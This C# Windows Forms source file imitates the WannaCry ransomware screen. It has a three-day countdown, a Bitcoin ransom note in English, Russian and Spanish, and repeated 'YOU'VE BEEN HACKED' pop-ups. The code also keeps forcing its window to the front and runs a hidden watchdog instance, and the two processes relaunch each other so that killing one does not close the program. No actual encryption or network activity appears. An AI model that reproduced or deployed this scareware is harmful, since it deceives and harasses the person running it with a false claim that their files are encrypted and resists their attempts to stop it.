﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;


namespace WannaCry
{
    public partial class WannaCry : Form
    {
        //Need total seconds to perform countdown correctly. Seconds indicated below sum up to 3 days total.
        //popupMinThreshold is used in timer2 coding section
        //The args array will hold argumets passed to application. Crucial for second instance kickoff

        private int totalSeconds = 259200;
        public int popupMinThreshhold = 0;
        string[] args = Environment.GetCommandLineArgs();
        private Boolean instance = false;

        public WannaCry()
        {
            InitializeComponent();
            //System.Diagnostics.Process.Start(Application.ExecutablePath);
        }
        
        //called when form loads
        private void WannaCry_Load(object sender, EventArgs e)
        {
            //Following var hopefully gets username of current user
            string userN = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            string userE = System.Environment.UserName;

            
            //System.Security.Principal.WindowsIdentity.GetCurrent().Name;

            //This is for the clock countdown and for annoying pops
            this.timer1.Enabled = true;
            this.timer2.Enabled = true;


            //If args < 2 then its original process. If its 2 or more then its the spun up instance
            if (args.Length < 2)
            {
                System.Diagnostics.Process[] pname = System.Diagnostics.Process.GetProcessesByName("WannaCry");
                if (pname.Length < 2)
                {
                    System.Diagnostics.Process.Start(Application.ExecutablePath, "instnace");
                }

            }
          
           

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            //Total seconds is set up top to 259200 (3 days). This piece of code updates the clock every second to show loss of time
            if (totalSeconds > 0)
            {
                totalSeconds--;

                int hours = totalSeconds / 3600;
                int minutes = (totalSeconds - (hours * 3600))/60;
                int seconds = (totalSeconds - (hours * 3600) - (minutes * 60));

                this.label3.Text = hours.ToString() + ":" + minutes.ToString() + ":" + seconds.ToString();
                this.label4.Text = hours.ToString() + ":" + minutes.ToString() + ":" + seconds.ToString();
                

            }
            else
            {
                this.timer1.Stop();
                MessageBox.Show("OOOOOOO TIMES UP!!");
            }

            //brings the GUI to front of screen every second (since timer1 interval is every second)

            if (args.Length < 2)
            {
                this.TopMost = true;
                this.TopMost = false;
            }

            //Reruns GUI if Killed for kicked off instance
    
            System.Diagnostics.Process[] pname = System.Diagnostics.Process.GetProcessesByName("WannaCry");
            if (pname.Length < 2)
            {
                if (args.Length < 2)
                {
                    System.Diagnostics.Process.Start(Application.ExecutablePath, "instance");
                }
                else
                {
                    System.Diagnostics.Process.Start(Application.ExecutablePath);
                }
                
           
            }

            if (args.Length > 1)
            {
                base.SetVisibleCore(false);
            }

            
        }

        private void button1_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.Clipboard.SetText(this.textBox2.Text);
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            string option = this.comboBox1.SelectedItem.ToString();
            if (option == "Russian")
            {
                this.textBox1.Text = "К сожалению, ваши файлы были зашифрованы\nЧто случилось с моим компьютером?\nВаши важные файлы зашифрованы.\nМногие из ваших документов, фотографий, видео, базы данных и других файлов не\nболее доступны, потому что они были зашифрованы. Может быть, вы заняты поиском\nдля способа восстановить ваши файлы, но не тратьте свое время. Никто не может восстановить ваши файлы\nбез нашей службы расшифровки.\nМогу ли я восстановить свои файлы\nКонечно. Мы гарантируем, что вы сможете легко и безопасно восстановить все свои файлы. Купить у вас есть\nтак не хватает времени.\nВы можете расшифровать некоторые из ваших файлов бесплатно. Попробуйте сейчас, нажав <Расшифровать>. Но если вы хотите немного\nваших файлов, возможно, вам придется заплатить. У вас есть только 3 дня, чтобы отправить платеж. После этого цена\nудвоится. Кроме того, если вы не заплатите в течение 7 дней, вы не сможете восстановить свои файлы навсегда.\nУ нас будут бесплатные мероприятия для пользователей, которые настолько бедны, что не могут платить уже 6 месяцев.\nКак мне платить?\nОплата принимается только в биткойнах. Для получения дополнительной информации нажмите <О биткойне>. пожалуйста, проверьте\nтекущую цену биткойнов и купить немного биткойнов. Для получения дополнительной информации нажмите <Как купить биткойн>.\nИ отправить правильную сумму на адрес, указанный в этом окне. После оплаты нажмите <Проверить платеж>.\nЛучшее время для проверки: с 9:00 до 11:00.\nпо Гринвичу с понедельника по пятницу.\nКак только оплата будет проверена, вы можете немедленно приступить к расшифровке файлов.\nКонтакт\nЕсли вам нужна помощь, отправьте сообщение, нажав <Связаться с нами>\nМы настоятельно рекомендуем вам не удалять и отключать антивирус на некоторое время, пока\nвы платите и платеж обрабатывается. Если ваш антивирус загружается и удаляется автоматически,\nон не сможет восстановить ваши файлы, даже если вы заплатите.\nМы настоятельно рекомендуем вам не удалять это программное обеспечение\n";
                this.label1.Text = "К сожалению, ваши файлы были зашифрованы!";
                this.linkLabel1.Text = "О Биткойне";
                this.linkLabel2.Text = "Как купить биткойн";
                this.linkLabel3.Text = "Связаться с нами";
            }
            else if (option == "English")
            {
                this.textBox1.Text = "Ooops, your files have been encrypted\nWhat Happened to My Computer?\n\nYour important files are encrypted. \nMany of your documents, photos, videos, database, and other files are no\nlonger accessible because they have been encrypted. Maybe you are busy looking\nfor a way to recover your files, but do not waste your time. Nobody can recover your files\nwithout our decryption service.\n\nCan I Recover My Files\nSure. We guarantee that you can recover all your files safely and easily. Buy you have\nnot so enough time. \n\nYou can decrypt some of your files for free. Try now by clicking <Decrypt>. But if you want some\nof your files you may need to pay. You only have 3 days to submit the payment. After that the price\nwill be doubled. Also, if you don'y pay in 7 days, you won't be able ro recover your files forever.\nWe will have free events for users who are so poor that they couldn't pay in 6 months. \n\nHow Do I Pay?\nPayment is accepted in Bitcoin only. For more information, click <About bitcoin>. Please check\nthe current price of Bitcoin and buy some bitcoins. For more information, click <How to buy bitcoin>.\nAndd send the correct amount to the address specified in this window. After your payment, click <Check Payment>.\nBest time to check: 9:00am - 11:00am.\nGMT from Monday to Friday.\nOnce the payment is checked, you can start decryting your files immediately.\n\nContact\nIf you need assistance, send a message by clicking <Contact Us>\nWe strongly recommend you to not remove, and disable your anti-virus for a while, until \nyou pay and the payment gets processed. If your anti-virus gets uploaded and removed automatically,\nit will not be able to recover your files even if you pay.\nWe strongly recommend you to not remove this software";
                this.label1.Text = "Ooops, your files have been encrypted!";
                this.linkLabel1.Text = "About Bitcoin";
                this.linkLabel2.Text = "How To Buy Bitcoin";
                this.linkLabel3.Text = "Contact Us";

            }
            else
            {
                this.textBox1.Text = "Ups, tus archivos han sido encriptados\n\n¿Qué pasó con mi computadora?\nSus archivos importantes están encriptados.\nMuchos de sus documentos, fotos, videos, bases de datos y otros archivos no son\nya no son accesibles porque han sido encriptados. Tal vez estés ocupado buscando\npara encontrar una forma de recuperar sus archivos, pero no pierda su tiempo. Nadie puede recuperar tus archivos.\nsin nuestro servicio de descifrado.\n\n¿Puedo recuperar mis archivos?\nSeguro. Le garantizamos que puede recuperar todos sus archivos de forma segura y sencilla. Compra lo que tienes\nno tanto tiempo.\nPuede descifrar algunos de sus archivos de forma gratuita. Pruébelo ahora haciendo clic en <Descifrar>. Pero si quieres algo\nde sus archivos puede que tenga que pagar. Solo tiene 3 días para enviar el pago. Después de eso el precio\nserá duplicado. Además, si no paga en 7 días, no podrá recuperar sus archivos para siempre.\nTendremos eventos gratuitos para los usuarios que son tan pobres que no pueden pagar en 6 meses.\n\n¿Cómo pago?\nEl pago se acepta solo en Bitcoin. Para obtener más información, haga clic en <Acerca de bitcoin>. por favor, compruebe\nel precio actual de Bitcoin y comprar algunos bitcoins. Para obtener más información, haga clic en <Cómo comprar bitcoin>.\nY envíe la cantidad correcta a la dirección especificada en esta ventana. Después de su pago, haga clic en <Comprobar pago>.\nMejor hora para comprobar: 9:00 am - 11:00 am.\nGMT de lunes a viernes.\nUna vez que se verifica el pago, puede comenzar a desacreditar sus archivos de inmediato.\n\nContacto\nSi necesita ayuda, envíe un mensaje haciendo clic en <Contáctenos>\n\nLe recomendamos enfáticamente que no elimine y deshabilite su antivirus por un tiempo, hasta que\nusted paga y el pago se procesa. Si su antivirus se carga y elimina automáticamente,\nno podrá recuperar sus archivos incluso si paga.\n\nLe recomendamos encarecidamente que no elimine este software.";
                this.label1.Text = "¡Ups! Tus archivos han sido encriptados";
                this.linkLabel1.Text = "Acerca de Bitcoin";
                this.linkLabel2.Text = "Cómo comprar bitcoins";
                this.linkLabel3.Text = "Contacta con nosotros";
            }
             
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            //Annoying popups. 20 popups occur each second for first 20 seconds
            //After that the popups occur every 10 seconds 
            if (popupMinThreshhold < 1 && args.Length < 2)
            {
                popupMinThreshhold++;
                MessageBox.Show("YOU\'VE BEEN HACKED");
                
            }
            else if (popupMinThreshhold == 2)
            {
                popupMinThreshhold+=3;
            }
            else
            {
                //Nothing Happens
            }
                
        }
    }
}
